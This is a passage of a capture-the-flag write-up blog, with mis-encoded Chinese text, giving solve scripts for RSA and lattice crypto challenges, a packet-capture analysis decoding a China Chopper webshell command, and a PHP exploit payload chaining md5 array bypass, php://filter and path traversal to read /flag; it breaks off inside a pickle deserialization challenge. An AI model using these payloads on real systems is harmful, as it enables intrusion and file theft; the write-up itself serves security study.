class="line">(p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span><br><span class="line">c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span><br><span class="line">invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span><br><span class="line">invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span><br></pre></td></tr></table></figure></blockquote><p>ç»™å‡º $(p-1)(q-1),x=\text{inv}(p,q),y=\text{inv}(q,p),e,c$ã€‚</p><p>è¯¦ç»†æ¨å¯¼æ€è·¯å¯å‚è€ƒ <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>ã€‚</p><p>è§£é¢˜è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span></span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span></span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    fn = <span class="number">15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = gmpy2.invert(e,fn)</span><br><span class="line">    pprime = <span class="number">63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span></span><br><span class="line">    qprime = <span class="number">61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span class="number">13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#b&#x27;flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;</code></p><p>â€‹    </p><h3 id="FillTheBlank"><a href="#FillTheBlank" class="headerlink" title="FillTheBlank"></a>FillTheBlank</h3><blockquote><p>æ¨å…¬å¼ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">b = <span class="string">&quot;**********&quot;</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line">flag=<span class="string">&quot;flag&#123;*************&#125;&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">z = <span class="string">&quot;**********&quot;</span></span><br><span class="line"></span><br><span class="line">rb = gmpy2.invert(b, p)  <span class="comment">#påº”ä¸ºa</span></span><br><span class="line">rd = gmpy2.invert(d, p)  <span class="comment">#påº”ä¸ºa</span></span><br><span class="line"></span><br><span class="line">x = rb*rd</span><br><span class="line">c = (m + z * rb * d % a)%a</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(x==<span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span>)</span><br><span class="line"><span class="keyword">assert</span>(c == <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(d)/log(<span class="number">2</span>)&lt;=<span class="number">200</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(z)/log(<span class="number">2</span>)&lt;=<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></blockquote><p>æ¨å¯¼ï¼š</p><p>ç”± $rb \equiv b^{-1} \pmod a$ å’Œ $rd \equiv d^{-1} \pmod a$ ï¼Œæœ‰ $rb \cdot b \cdot rd \cdot d = x \cdot b \cdot d \equiv 1 \pmod a$ã€‚</p><p>æ•…æ±‚å‡º $b \equiv (x \cdot d)^{-1} \pmod a$ï¼Œ$rb \equiv b^{-1} \pmod a$ã€‚</p><p>åˆ $c = (m+z \cdot rb \cdot d) \bmod a$ï¼Œæ„é€ æ ¼ $L=\begin{bmatrix} 1 &amp; rb \cdot d \\ 0 &amp; a \end{bmatrix}$ï¼Œåˆ©ç”¨LLLç®—æ³•æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span></span><br><span class="line">c = <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">b = gmpy2.invert(x*d,a)</span><br><span class="line">rb = gmpy2.invert(b,a)</span><br><span class="line">rd = gmpy2.invert(d,a)</span><br><span class="line">h = rb*d%a</span><br><span class="line"></span><br><span class="line">p = a</span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = -f, -g</span><br><span class="line"><span class="comment">#print(f, g)</span></span><br><span class="line"></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;we1c0mE_t0_cr4aK_mE!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;we1c0mE_t0_cr4aK_mE!&#125;</code></p><p>â€‹    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><blockquote><p>flag{W3Lc0m3_t0_2o2I_3n3rgy_contest}</p></blockquote><p>ç­¾åˆ°ã€‚</p><p><strong>FLAG:</strong> <code>flag&#123;W3Lc0m3_t0_2o2I_3n3rgy_contest&#125;</code></p><p>â€‹    </p><h3 id="hardwire-1"><a href="#hardwire-1" class="headerlink" title="hardwire_1"></a>hardwire_1</h3><blockquote><p>ä¸‹è½½é™„ä»¶å‹ç¼©åŒ…ï¼Œåˆ†ææ–‡ä»¶ï¼Œæ‰¾åˆ°flagã€‚æäº¤flagæ ¼å¼ï¼šflag{xxxx}ã€‚</p></blockquote><p>æµé‡åŒ…æ–‡ä»¶ï¼Œwiresharkæ‰“å¼€ï¼Œè¿½è¸ªTCPæµï¼Œå‘ç°èœåˆ€è¿æ¥æµé‡ç‰¹å¾ã€‚</p><p>è§£ææµ1ä¸­<code>z2</code>å‚æ•°å€¼ï¼Œbase64è§£ç å¾—ï¼š</p><p><code>cd /d &quot;C:\php\htdocs&quot;&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E]</code></p><p>è§£ææµ3ä¸­<code>z0</code>å‚æ•°å€¼ï¼Œbase64è§£ç è½¬å­˜å¾—åˆ°Raræ–‡ä»¶ <code>key.rar</code>ã€‚</p><p>ç»“åˆå‰é¢çš„è§£å‹å¯†ç  <code>f@l#ag102</code>ï¼Œè§£å‹å¾—åˆ° flag.jpgã€‚</p><p><strong>FLAG:</strong> <code>flag&#123;579a4da9e3375c9b96add11cf2915eb5&#125;</code></p><p>â€‹    </p><h3 id="wava"><a href="#wava" class="headerlink" title="wava"></a>wava</h3><blockquote><p>Do you know what is wava?</p></blockquote><p>é™„ä»¶move.zipæ— æ³•æ‰“å¼€ï¼Œ010editoræŸ¥çœ‹ä¸ºwavæ–‡ä»¶å¤´ï¼Œä¿®æ”¹åç¼€ï¼Œä½¿ç”¨audacityæ‰“å¼€æœªå‘ç°æœ‰ç”¨ä¿¡æ¯ã€‚</p><p>å›åˆ°16è¿›åˆ¶ä¸‹æŸ¥çœ‹ï¼Œå‘ç°åœ¨0x69å¤„å­˜åœ¨å¦ä¸€ä¸ªwavæ–‡ä»¶å¤´ï¼Œåˆ é™¤å‰é¢çš„æ–‡ä»¶å¤´ä¿å­˜ï¼Œé‡æ–°ä½¿ç”¨audacityæ‰“å¼€ï¼Œå‘ç°æ‘©æ–¯å¯†ç ï¼Œæ‰‹æ’¸ä¸‹æ¥å¾—åˆ°ï¼š</p><p><code>..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...-- ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. -----</code></p><p>è§£ç å¾—flagã€‚</p><p><strong>FLAG:</strong> <code>flag&#123;04d1de6d63aa1b5b5573fc6e08e396f0&#125;</code></p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><blockquote><p>æƒ³çœ‹äºŒæ¬¡å…ƒæœ‰å¾ˆå¤šéšœç¢(flagåœ¨/flag)</p></blockquote><p>ç‚¹æäº¤æŒ‰é’®å‡ºç°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>])&#123; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">æƒ³çœ‹ä¸ªäºŒæ¬¡å…ƒæ€ä¹ˆè¿™ä¹ˆéš¾</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;GET&#x27;</span>&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;site&#x27;</span> style=<span class="string">&quot;width:1000px&quot;</span> value=<span class="string">&quot;https://bilibili.com/&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]===<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])||(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])!=md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>]; </span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="variable">$url_schema</span> = parse_url(<span class="variable">$url</span>); </span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$url_schema</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line"><span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&quot;/v/popular/all&quot;</span>.<span class="variable">$path</span>; </span><br><span class="line"><span class="variable">$res</span> = file_get_contents(<span class="variable">$request_url</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr(<span class="variable">$res</span>,<span class="string">&quot;flag&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t see my flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$request_url</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;get source failed&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ï¼ŒPHP md5å¼±æ¯”è¾ƒæ€§è´¨ç»•è¿‡ï¼š<code>user[]=1&amp;password[]=2</code></p><p>ç¬¬äºŒå±‚ï¼ŒPHPä¼ªåè®®æ‹¼æ¥ç»•è¿‡å…³é”®è¯+ç›®å½•ç©¿è¶Šï¼š<code>site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag</code></p><p>payload:</p><p><code>?submit=%E6%8F%90%E4%BA%A4&amp;site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag&amp;user[]=1&amp;password[]=2</code></p><p>å¾—åˆ°<code>ZmxhZ3tqWkV0NkNrRmNSOFNHbVBCTjJobDVvcjBYVzRUM251TX0K</code>ï¼Œbase64è§£ç å¾—flagã€‚</p><p><strong>FLAG:</strong> <code>flag&#123;jZEt6CkFcR8SGmPBN2hl5or0XW4T3nuM&#125;</code></p><p>â€‹    </p><h3 id="EZpy"><a href="#EZpy" class="headerlink" title="EZpy"></a>EZpy</h3><blockquote><p>pickleååºåˆ—åŒ–</p></blockquote><p>åŠ å‚æ•° <code>?source=1</code> å¾—åˆ°æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span 